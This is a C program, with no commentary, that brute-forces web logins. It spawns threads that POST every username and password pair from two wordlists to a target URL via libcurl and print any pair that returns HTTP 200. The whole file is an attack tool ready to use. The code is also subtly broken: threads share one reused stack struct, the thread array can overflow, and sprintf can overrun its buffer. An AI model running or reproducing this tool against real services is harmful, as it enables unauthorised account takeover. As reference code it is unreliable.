#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <pthread.h>

#define MAX_LEN 256

struct login_data {
    char hostname[MAX_LEN];
    char username[MAX_LEN];
    char password[MAX_LEN];
};

void *worker(void *arg) {
    struct login_data *data = (struct login_data *)arg;

    CURL *curl;
    CURLcode res;

    char post_data[MAX_LEN];
    sprintf(post_data, "username=%s&password=%s", data->username, data->password);

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, data->hostname);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
        }
        else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            if (response_code == 200) {
                printf("Valid credentials found: username=%s, password=%s\n", data->username, data->password);
                exit(0);
            }
        }

        curl_easy_cleanup(curl);
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <username_file> <password_file> <hostname>\n", argv[0]);
        return 1;
    }

    char *username_file = argv[1];
    char *password_file = argv[2];
    char *hostname = argv[3];

    FILE *fp1 = fopen(username_file, "r");
    if (fp1 == NULL) {
        perror("Error opening username file");
        return 1;
    }

    FILE *fp2 = fopen(password_file, "r");
    if (fp2 == NULL) {
        perror("Error opening password file");
        return 1;
    }

    char username[MAX_LEN];
    char password[MAX_LEN];
    pthread_t threads[MAX_LEN];
    int thread_count = 0;

    while (fgets(username, MAX_LEN, fp1) != NULL) {
        username[strcspn(username, "\r\n")] = '\0';
        while (fgets(password, MAX_LEN, fp2) != NULL) {
            password[strcspn(password, "\r\n")] = '\0';

            struct login_data data;
            strcpy(data.hostname, hostname);
            strcpy(data.username, username);
            strcpy(data.password, password);

            int res = pthread_create(&threads[thread_count++], NULL, worker, &data);
            if (res != 0) {
                perror("Error creating thread");
                return 1;
            }
        }

        rewind(fp2);
    }

    fclose(fp1);
    fclose(fp2);

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
